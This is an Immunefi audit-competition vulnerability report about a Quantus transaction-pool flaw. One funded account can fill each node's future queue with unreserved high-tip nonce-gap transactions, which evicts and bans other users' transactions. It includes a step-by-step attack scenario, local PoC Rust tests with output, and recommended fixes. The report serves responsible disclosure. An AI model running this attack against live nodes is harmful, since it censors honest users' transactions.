# 90496 bc low one 1 000 quan balance advertises 1 838 500 quan of unreserved tips to monopolize each targeted node s future queue

**Submitted on Aug 25th 2026 at 09:57:09 UTC by @tinnohofficial for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90496
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

Quantus ranks nonce-gap transactions by advertised tip after checking only that the signer could pay one transaction. The tip is neither withdrawn nor reserved while the transaction remains in the future queue.

One ordinary account holding 1,000 QUAN can therefore sign all 3,677 transactions needed to fill a default future queue, with nonces `1..=3677` and a 500-QUAN tip on each. This creates **1,838,500 QUAN of aggregate advertised tips per node** from the same unchanged 1,000-QUAN balance. No tip or fee is paid while nonce 0 is withheld.

Quantus's priority-first capacity policy then deterministically evicts every newer lower-priority future transaction, returns `ImmediatelyDropped`, and bans its hash for 30 minutes. The default pool does not revalidate future entries, and the immortal attack set effectively never expires.

The same approximately 19.7 MB signed set can be reused against every reachable node without new signatures or capital. The official SDK configures three RPC URLs, exposes no tip control, hardcodes zero tip in every software and hardware transaction-construction path, and retries the exact same signed bytes. The measured official-wallet victim transfer has priority 736, while a 0.001-QUAN attacker tip receives `1,000,000,001` times that priority. Official-wallet users cannot attach a competing tip without leaving the official client and constructing custom extrinsics. Any unprivileged user with one funded account can therefore establish persistent censorship of affected official-wallet future transactions on each targeted RPC or processing node.

### Vulnerability Details

#### Default future capacity is 3,677 entries

`client/cli/src/params/transaction_pool_params.rs:45-55` sets the default full-pool count to 36,772 and size to 262,144 KiB. `client/transaction-pool/src/builder.rs:71-81` assigns one tenth to future transactions: 3,677 entries and 26,843,545 bytes. The PoC's 3,677 signed transactions consume at most 19,657,242 bytes, so the count limit binds first.

#### Validation assigns tip priority without consuming or reserving the tip

`pallets/transaction-payment/src/lib.rs:836-929,1003-1045` checks whether the signer can withdraw `fee + tip` and calculates priority from `tip + 1` during validation:

```rust
let fee_with_tip = self.can_withdraw_fee(&who, call, info, len)?;
let tip = self.0;
Ok((
    ValidTransaction {
        priority: Self::get_priority(info, len, tip, fee_with_tip),
        ..Default::default()
    },
    Val::Charge { tip: self.0, who, fee_with_tip },
    origin,
))
```

Withdrawal occurs only later in `prepare`. A nonce-gap transaction does not reach that stage, so all 3,677 validations reuse the same balance. The runtime PoC signs every nonce with genuine ML-DSA and the production extension tuple; the account remains at nonce zero with its complete 1,000-QUAN balance.

#### The advertised tip is an attacker-selected barrier, not a fixed 500-QUAN cost

The PoC uses 500 QUAN to demonstrate a high censorship barrier while leaving fee margin. The 5,346-byte transaction receives:

```
attacker priority = 735 * (500,000,000,000,000 + 1)
                  = 367,500,000,000,000,735
```

The attacker chooses this barrier. The PoC directly measures a 0.001-QUAN tip at priority `736000000736`, exactly `1,000,000,001` times the measured zero-tip victim priority 736. `substrate_service.dart:238,265,282,316` hardcodes `tip: 0` in the software signing payload, signed extrinsic, fee-estimation extrinsic, and hardware signing payload, while `mobile-app/lib` contains no tip setting or override. Priority can vary with transaction length, weight, and class, but the official app gives users no way to attach the competing tip required by this eviction policy. Matching Mallory's chosen barrier therefore requires hand-building extrinsics outside the official client. Mallory pays no advertised tip while preserving the nonce gap; a victim's competing tip becomes payable if their transaction becomes ready and executes.

#### The Quantus future policy protects the highest advertised priorities

`client/transaction-pool/src/graph/base_pool.rs:530-568` selects the lowest-priority future entry whenever the limit is exceeded. Age only breaks equal-priority ties, with the older entry evicted:

```rust
match worst.transaction.priority.cmp(&current.transaction.priority) {
    Ordering::Less => worst,
    Ordering::Greater => current.clone(),
    Ordering::Equal => /* evict the older entry */,
}
```

`client/transaction-pool/src/graph/validated_pool.rs:296-329,396-423` then converts eviction of the incoming transaction into `ImmediatelyDropped` and bans every limit-evicted hash. The default ban is 1,800 seconds (`client/transaction-pool/src/builder.rs:76-81`).

#### One reusable set can target the configured RPC fleet

Future transactions are not automatically propagated because `client/service/src/lib.rs:475-492` exports only `pool.ready()`. However, RPC submission and direct peer import are normal external ingress; the transaction protocol forwards received bytes to `submit_one(..., TransactionSource::External, ...)` at lines 518-548.

The attacker therefore submits the same immortal, genesis-bound 19.7 MB set to each target. No new signatures or account balance are needed per node. The official SDK ships three RPC URLs (`app_constants.dart:14-19`) and independently performs nonce lookup and submission through its redundant endpoint service. Failover can submit a nonce derived from one node's pending pool to another node where its predecessor is absent, creating exactly the affected future transaction.

The SDK then amplifies the failure: `substrate_service.dart:179-201` signs once and retries the exact same bytes. The first capacity eviction bans that hash; retries encounter the same 30-minute ban, while a freshly signed zero-tip replacement is evicted again.

#### Admitted entries are not revalidated and effectively never expire

Default single-state maintenance revalidates only `ready()` hashes (`single_state_txpool.rs:807-809`). Stale cleanup inspects future entries but only removes expired transactions (`validated_pool.rs:721-757`); the runtime PoC reports longevity `18446744073709551613`. Later affordability changes therefore do not remove the set.

Preserving the pin requires withholding nonce 0. Mallory can end it with a zero-tip current-nonce `transfer_all`: the PoC proves that only this ordinary exit transaction pays a fee and the promoted high-tip transaction is rejected with `Payment`, without charging an attack-sized tip.

#### Attack Scenario

{% stepper %}
{% step %}

### Fund and preserve nonce zero

Mallory funds one ordinary account with 1,000 QUAN and keeps its on-chain nonce at zero.
{% endstep %}

{% step %}

### Sign the future set

Mallory signs one immortal set of 3,677 transfers with nonces `1..=3677` and a 500-QUAN tip each.
{% endstep %}

{% step %}

### Submit to target nodes

Mallory submits the same set to each targeted RPC or processing node. Every node accepts all entries against the same unchanged balance.
{% endstep %}

{% step %}

### Fill the future queue

Each target's complete future queue is now protected by priority `367500000000000735`, representing 1,838,500 QUAN of aggregate advertised tips that were never reserved or paid.
{% endstep %}

{% step %}

### Submit a lower-priority victim transaction

Alice submits a zero-tip transaction whose predecessor is absent on that node, including through ordinary endpoint failover or out-of-order sequential submission.
{% endstep %}

{% step %}

### Evict and ban the victim transaction

The pool evicts Alice's runtime-valid transaction, returns `ImmediatelyDropped`, and bans its hash for 30 minutes. The official SDK retries the same banned bytes.
{% endstep %}

{% step %}

### Maintain persistent denial

Every later lower-priority future transaction is rejected without further attacker traffic. The same attack set remains reusable after a pool restart.
{% endstep %}
{% endstepper %}

#### Quantus-specific implementation

The vulnerable priority-first future policy is a Quantus modification, not an unmodified upstream report. Commit `8f4e0d5fbcddc8299ad13ccc10840044e3e702f2` changed future eviction from oldest-first in parent `e362a8776e883b598d8966695d8b02ca1ed178f9` to lowest-priority-first. The change was intended to stop low-priority flooding, but combining it with reusable, unreserved tip priority lets one funded signer invert the defense and protect an entire nonce-gap set.

This report concerns the interaction between that Quantus eviction change, runtime validation that assigns priority before tip withdrawal, and the absence of per-signer future-queue limits. The PoCs exercise that interaction in the in-scope Quantus runtime and Quantus-modified transaction pool at the frozen revision.

## Impact Details

One unprivileged account can occupy all 3,677 future-transaction slots on each targeted node and deny every lower-priority transaction in that class, including sequential withdrawals and batched payouts whose predecessor is pending elsewhere. Admission and eviction are automatic; no validator, node operator, governance actor, or victim cooperation is required. Victims receive terminal drops and repeated retry failures despite submitting runtime-valid transactions.

One 1,000-QUAN balance backs 1,838,500 QUAN of advertised tips per node, and the same balance and signatures work across targets. Mallory sends the bounded set once per node, pays no admission fee or tip, and needs no continuing traffic for practical node lifetime. Capital is tied only while preserving the pin; the tested unwind pays one ordinary transaction fee rather than an advertised 500-QUAN attack tip.

Within the targeted class the denial is complete and persistent: every lower-priority future transaction is evicted, the official client exposes no tip control to cross the attacker-selected barrier, and the attack entries are not revalidated and effectively never expire. Ready transactions are unaffected, each node must be reached directly, a custom client can displace entries by matching the attacker's tip, and an operator can clear the pool, though the still-valid set can refill it immediately. Those boundaries support the selected **Medium - Griefing** impact while leaving the complete per-node denial intact.

## Recommended Fix

{% stepper %}
{% step %}

### Cap nonce-gap entries per signer

Cap nonce-gap entries per signer before applying the global limit.
{% endstep %}

{% step %}

### Account for cumulative exposure

Rank a signer's future set by cumulative affordable/reserved exposure, not independently reusable tips.
{% endstep %}

{% step %}

### Age and expire future priority

Age future priority and impose a pool lifetime independent of immortal runtime longevity.
{% endstep %}

{% step %}

### Avoid banning capacity-evicted valid transactions

Do not ban valid transactions solely because capacity enforcement selected them for eviction.
{% endstep %}
{% endstepper %}

## References

* `client/cli/src/params/transaction_pool_params.rs:45-55`
* `client/transaction-pool/src/builder.rs:56-84`
* `client/transaction-pool/src/graph/base_pool.rs:530-568`
* `client/transaction-pool/src/graph/base_pool.rs:344-400,625-672`
* `client/transaction-pool/src/graph/pool.rs:428-496`
* `client/transaction-pool/src/graph/validated_pool.rs:296-329,396-423`
* `client/transaction-pool/src/graph/validated_pool.rs:721-757`
* `client/transaction-pool/src/single_state_txpool/single_state_txpool.rs:807-809`
* `client/service/src/lib.rs:475-492,518-548`
* `pallets/frame-system/src/extensions/check_nonce.rs:70-99`
* `pallets/balances/src/lib.rs:716-752`
* `pallets/transaction-payment/src/lib.rs:836-929,1003-1045`
* `quantus_sdk/lib/src/constants/app_constants.dart:14-19`
* `quantus_sdk/lib/src/services/network/redundant_endpoint.dart:71-95`
* `quantus_sdk/lib/src/services/substrate_service.dart:117-124,179-201,213-283,307-354`
* [Chain commit `8f4e0d5fbcddc8299ad13ccc10840044e3e702f2`](https://github.com/immunefi-team/audit-comp-quantus-chain/commit/8f4e0d5fbcddc8299ad13ccc10840044e3e702f2) and [parent `e362a8776e883b598d8966695d8b02ca1ed178f9`](https://github.com/immunefi-team/audit-comp-quantus-chain/commit/e362a8776e883b598d8966695d8b02ca1ed178f9) (future-queue eviction policy change)

## Proof of Concept

Two complementary tests demonstrate the exploit and its exact boundary without sending any network traffic:

* production-runtime tests sign and validate all 3,677 high-tip nonce-gap transactions against the same unchanged account state, measure the 0.001-QUAN priority, and prove a zero-tip `transfer_all` unwind does not charge the attack tip;
* a real Quantus transaction-pool test proves lower-priority eviction and banning, then proves that a later equal-priority victim displaces the older attacker.

### Setup

From `audit-comp-quantus-chain` at frozen revision `3b243b870a5442a6e5f443056f67bbba87d472f5`:

{% stepper %}
{% step %}

### Create the runtime PoC

Create `runtime/tests/transactions/future_priority_pin.rs` with the runtime PoC code below.
{% endstep %}

{% step %}

### Register the runtime module

Add the following line to `runtime/tests/transactions/mod.rs`:

```rust
pub mod future_priority_pin;
```

{% endstep %}

{% step %}

### Add the pool test

Add the pool helper and test below inside the existing `watcher_reclaim_tests` module in `client/transaction-pool/src/graph/validated_pool.rs`.
{% endstep %}
{% endstepper %}

### Run

Production runtime validity, balance reuse, sizing, priority, and unwind economics:

```bash
SKIP_WASM_BUILD=1 cargo test -p quantus-runtime --test mod future_priority_pin -- --nocapture
```

Actual Quantus eviction, ban, and equal-priority control:

```bash
cargo test -p sc-transaction-pool held_tip_future_blocks_lower_priority_but_not_equal_priority -- --nocapture
```

### Observed Output

Runtime test:

```
UNWIND_TIP=0 ATTACK_TIP_CHARGED=false ATTACK_REJECTED=Payment REMAINING_BALANCE=1000000000 ATTACK_NONCE_AFTER_EXIT=1
test transactions::future_priority_pin::current_nonce_transfer_all_unwinds_without_paying_the_attack_tip ... ok
VICTIM_PRIORITY=736 LOW_TIP_PRIORITY=736000000736 LOW_TIP_BYTES=5341 ATTACKER_PRIORITY=367500000000000735 ADVERTISED_TIP=500000000000000 ATTACKER_NONCE=0 FUTURE_LONGEVITY=18446744073709551613 TIP_CHARGED=0 VALIDATED_GAP_ENTRIES=3677 BALANCE_REUSED_FOR_ALL_GAP_ENTRIES=true ATTACKER_BYTES=5346 DEFAULT_FUTURE_BYTES=26843545
test transactions::future_priority_pin::one_balance_reusably_backs_high_tips_across_nonce_gaps ... ok
test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 42 filtered out
```

Pool test:

```
FUTURE_LIMIT=1 HELD_TIP_PRIORITY=367500000000000735 LOWER_PRIORITY_SURVIVOR=ATTACKER LOWER_PRIORITY_VICTIM_EVICTED=true LOWER_PRIORITY_VICTIM_BANNED=true EQUAL_PRIORITY_CONTROL_SURVIVOR=VICTIM
test graph::validated_pool::watcher_reclaim_tests::held_tip_future_blocks_lower_priority_but_not_equal_priority ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 92 filtered out
```

The one-entry pool limit is a safe deterministic abstraction of the production 3,677-entry limit. The runtime test independently proves that the production count can be filled by one account.

### PoC Code: Production Runtime Test

Place this code in `runtime/tests/transactions/future_priority_pin.rs`:

```rust
use codec::Encode;
use frame_support::{storage::TransactionOutcome, traits::Currency};
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Balances, BalancesCall, Executive, Runtime, RuntimeCall, RuntimeEvent, Signature, SignedPayload,
	System, TxExtension, UncheckedExtrinsic, MILLI_UNIT, UNIT, VERSION,
};
use sp_core::{crypto::AccountId32, Pair};
use sp_runtime::{
	generic::Era,
	traits::IdentifyAccount,
	transaction_validity::{
		InvalidTransaction, TransactionSource, TransactionValidity, TransactionValidityError,
	},
	MultiAddress,
};

fn signed_call(
	pair: &Dilithium65Pair,
	sender: AccountId32,
	call: RuntimeCall,
	nonce: u32,
	tip: u128,
) -> UncheckedExtrinsic {
	let genesis_hash = System::block_hash(0);
	let tx_ext: TxExtension = (
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
		frame_system::CheckNonce::<Runtime>::from(nonce),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(tip),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	);
	let payload = SignedPayload::from_raw(
		call.clone(),
		tx_ext.clone(),
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis_hash,
			genesis_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	);
	let signature = payload.using_encoded(|encoded| pair.sign(encoded));

	UncheckedExtrinsic::new_signed(
		call,
		MultiAddress::Id(sender),
		Signature::Dilithium65(signature),
		tx_ext,
	)
}

fn signed_future_transfer(
	pair: &Dilithium65Pair,
	sender: AccountId32,
	nonce: u32,
	tip: u128,
) -> UncheckedExtrinsic {
	let call: RuntimeCall = BalancesCall::transfer_keep_alive {
		dest: MultiAddress::Id(AccountId32::new([0x55; 32])),
		value: 1,
	}
	.into();
	signed_call(pair, sender, call, nonce, tip)
}

fn validate_at_best_state(transaction: UncheckedExtrinsic) -> TransactionValidity {
	frame_support::storage::with_transaction_unchecked(|| {
		TransactionOutcome::Rollback(Executive::validate_transaction(
			TransactionSource::External,
			transaction,
			System::block_hash(0),
		))
	})
}

#[test]
fn one_balance_reusably_backs_high_tips_across_nonce_gaps() {
	use quantus_runtime::BuildStorage;

	let attacker_pair = Dilithium65Pair::from_seed_slice(&[0x41; 32]).unwrap();
	let victim_pair = Dilithium65Pair::from_seed_slice(&[0x42; 32]).unwrap();
	let attacker = attacker_pair.public().into_account();
	let victim = victim_pair.public().into_account();
	let initial_balance = 1_000 * UNIT;
	let advertised_tip = initial_balance / 2;
	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	let mut ext = sp_io::TestExternalities::new(storage);

	ext.execute_with(|| {
		System::set_block_number(1);
		Balances::make_free_balance_be(&attacker, initial_balance);
		Balances::make_free_balance_be(&victim, initial_balance);

		let victim_validity =
			validate_at_best_state(signed_future_transfer(&victim_pair, victim.clone(), 1, 0))
				.expect("the victim nonce-gap transaction is pool-valid");
		let low_tip_tx = signed_future_transfer(
			&attacker_pair,
			attacker.clone(),
			1,
			MILLI_UNIT,
		);
		let low_tip_bytes = low_tip_tx.encode().len();
		let low_tip_validity = validate_at_best_state(low_tip_tx)
			.expect("the 0.001-QUAN transaction is pool-valid");
		let default_future_bytes = 262_144usize * 1024 / 10;
		let mut attacker_validity = None;
		let mut distant_attacker_validity = None;
		let mut max_attacker_bytes = 0;
		for nonce in 1..=3_677 {
			let attacker_tx =
				signed_future_transfer(&attacker_pair, attacker.clone(), nonce, advertised_tip);
			max_attacker_bytes = max_attacker_bytes.max(attacker_tx.encode().len());
			let validity = validate_at_best_state(attacker_tx)
				.expect("every transaction needed to fill the future queue is pool-valid");
			assert!(!validity.requires.is_empty());
			match nonce {
				1 => attacker_validity = Some(validity),
				3_677 => distant_attacker_validity = Some(validity),
				_ => {},
			}
		}
		let attacker_validity = attacker_validity.expect("nonce 1 was validated");
		let distant_attacker_validity =
			distant_attacker_validity.expect("nonce 3,677 was validated");

		assert_eq!(low_tip_validity.priority, 736_000_000_736);
		assert!(!victim_validity.requires.is_empty());
		assert!(!attacker_validity.requires.is_empty());
		assert!(!distant_attacker_validity.requires.is_empty());
		assert_ne!(attacker_validity.provides, distant_attacker_validity.provides);
		assert!(
			attacker_validity.priority > 100_000_000_000_000_000 &&
				attacker_validity.priority > victim_validity.priority
		);
		assert!(attacker_validity.longevity > u64::MAX - 100);
		assert!(distant_attacker_validity.longevity > u64::MAX - 100);
		assert!(max_attacker_bytes * 3_677 <= default_future_bytes);
		assert_eq!(System::account_nonce(&attacker), 0);
		assert_eq!(Balances::free_balance(&attacker), initial_balance);
		assert_eq!(Balances::free_balance(&victim), initial_balance);

		println!(
			"VICTIM_PRIORITY={} LOW_TIP_PRIORITY={} LOW_TIP_BYTES={low_tip_bytes} ATTACKER_PRIORITY={} ADVERTISED_TIP={advertised_tip} ATTACKER_NONCE=0 FUTURE_LONGEVITY={} TIP_CHARGED=0 VALIDATED_GAP_ENTRIES=3677 BALANCE_REUSED_FOR_ALL_GAP_ENTRIES=true ATTACKER_BYTES={} DEFAULT_FUTURE_BYTES={}",
			victim_validity.priority,
			low_tip_validity.priority,
			attacker_validity.priority,
			attacker_validity.longevity,
			max_attacker_bytes,
			default_future_bytes,
		);
	});
}

#[test]
fn current_nonce_transfer_all_unwinds_without_paying_the_attack_tip() {
	use quantus_runtime::BuildStorage;

	let attacker_pair = Dilithium65Pair::from_seed_slice(&[0x43; 32]).unwrap();
	let attacker = attacker_pair.public().into_account();
	let destination = AccountId32::new([0x44; 32]);
	let initial_balance = 1_000 * UNIT;
	let advertised_tip = initial_balance / 2;
	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	let mut ext = sp_io::TestExternalities::new(storage);

	ext.execute_with(|| {
		System::set_block_number(1);
		Balances::make_free_balance_be(&attacker, initial_balance);
		let attack = signed_future_transfer(
			&attacker_pair,
			attacker.clone(),
			1,
			advertised_tip,
		);
		validate_at_best_state(attack.clone()).expect("the attack is valid before unwind");

		let exit_call: RuntimeCall = BalancesCall::transfer_all {
			dest: MultiAddress::Id(destination.clone()),
			keep_alive: true,
		}
		.into();
		let exit = signed_call(&attacker_pair, attacker.clone(), exit_call, 0, 0);
		assert!(Executive::apply_extrinsic(exit).expect("exit validates").is_ok());
		let remaining = Balances::free_balance(&attacker);
		assert!(remaining < advertised_tip);
		assert!(Balances::free_balance(&destination) > 0);
		assert_eq!(System::account_nonce(&attacker), 1);

		let result = Executive::apply_extrinsic(attack);
		assert!(matches!(
			result,
			Err(TransactionValidityError::Invalid(InvalidTransaction::Payment))
		));
		assert_eq!(Balances::free_balance(&attacker), remaining);
		assert_eq!(System::account_nonce(&attacker), 1);
		let paid_tips = System::events()
			.into_iter()
			.filter_map(|record| match record.event {
				RuntimeEvent::TransactionPayment(
					pallet_transaction_payment::Event::TransactionFeePaid { who, tip, .. },
				) if who == attacker => Some(tip),
				_ => None,
			})
			.collect::<Vec<_>>();
		assert_eq!(paid_tips, vec![0]);

		println!(
			"UNWIND_TIP=0 ATTACK_TIP_CHARGED=false ATTACK_REJECTED=Payment REMAINING_BALANCE={remaining} ATTACK_NONCE_AFTER_EXIT={}",
			System::account_nonce(&attacker),
		);
	});
}
```

### PoC Code: Quantus Pool Eviction and Ban Test

Add this helper and test inside `mod watcher_reclaim_tests` in `client/transaction-pool/src/graph/validated_pool.rs`:

```rust
fn future_tx(
	api: &MockChainApi,
	value: u64,
	priority: TransactionPriority,
	requires: Tag,
	provides: Tag,
) -> ValidatedTransactionFor<MockChainApi> {
	let data = Arc::new(xt(value));
	let (hash, bytes) = api.hash_and_length(&data);
	ValidatedTransaction::valid_at(
		0,
		hash,
		base::TimedTransactionSource::new_external(false),
		data,
		bytes,
		ValidTransaction {
			priority,
			requires: vec![requires],
			provides: vec![provides],
			longevity: u64::MAX,
			propagate: true,
		},
	)
}

#[test]
fn held_tip_future_blocks_lower_priority_but_not_equal_priority() {
	let api = Arc::new(MockChainApi::default());
	let mut options = Options::default();
	options.future = base::Limit { count: 1, total_bytes: usize::MAX };
	let pool: ValidatedPool<MockChainApi, ()> =
		ValidatedPool::new(options, true.into(), api.clone());
	let held_tip_priority = 367_500_000_000_000_735;

	let attacker = future_tx(
		&api,
		20,
		held_tip_priority,
		b"attacker-missing".to_vec(),
		b"attacker".to_vec(),
	);
	let attacker_hash = match &attacker {
		ValidatedTransaction::Valid(tx) => tx.hash,
		_ => unreachable!("future_tx always returns Valid"),
	};
	assert!(pool.submit([attacker]).pop().unwrap().is_ok());
	assert_eq!(pool.status().future, 1);

	let victim = future_tx(&api, 10, 1, b"victim-missing".to_vec(), b"victim".to_vec());
	let victim_hash = match &victim {
		ValidatedTransaction::Valid(tx) => tx.hash,
		_ => unreachable!("future_tx always returns Valid"),
	};
	let result = pool.submit([victim]).pop().unwrap();
	assert!(matches!(result, Err(error::Error::ImmediatelyDropped)));

	let future_hashes = pool.futures().into_iter().map(|(hash, _)| hash).collect::<Vec<_>>();
	assert_eq!(future_hashes, vec![attacker_hash]);
	assert!(pool.is_banned(&victim_hash));
	assert!(!pool.is_banned(&attacker_hash));

	// Age is the tie-breaker: an equally prioritized later transaction displaces
	// the older attacker. This bounds the finding to lower-priority victims.
	let mut equal_options = Options::default();
	equal_options.future = base::Limit { count: 1, total_bytes: usize::MAX };
	let equal_pool: ValidatedPool<MockChainApi, ()> =
		ValidatedPool::new(equal_options, true.into(), api.clone());
	let equal_attacker = future_tx(
		&api,
		30,
		held_tip_priority,
		b"equal-attacker-missing".to_vec(),
		b"equal-attacker".to_vec(),
	);
	let equal_attacker_hash = match &equal_attacker {
		ValidatedTransaction::Valid(tx) => tx.hash,
		_ => unreachable!("future_tx always returns Valid"),
	};
	assert!(equal_pool.submit([equal_attacker]).pop().unwrap().is_ok());
	std::thread::sleep(std::time::Duration::from_millis(1));

	let equal_victim = future_tx(
		&api,
		40,
		held_tip_priority,
		b"equal-victim-missing".to_vec(),
		b"equal-victim".to_vec(),
	);
	let equal_victim_hash = match &equal_victim {
		ValidatedTransaction::Valid(tx) => tx.hash,
		_ => unreachable!("future_tx always returns Valid"),
	};
	assert!(equal_pool.submit([equal_victim]).pop().unwrap().is_ok());

	let equal_future_hashes =
		equal_pool.futures().into_iter().map(|(hash, _)| hash).collect::<Vec<_>>();
	assert_eq!(equal_future_hashes, vec![equal_victim_hash]);
	assert!(equal_pool.is_banned(&equal_attacker_hash));
	assert!(!equal_pool.is_banned(&equal_victim_hash));
	println!(
		"FUTURE_LIMIT=1 HELD_TIP_PRIORITY={held_tip_priority} LOWER_PRIORITY_SURVIVOR=ATTACKER LOWER_PRIORITY_VICTIM_EVICTED=true LOWER_PRIORITY_VICTIM_BANNED=true EQUAL_PRIORITY_CONTROL_SURVIVOR=VICTIM"
	);
}
```
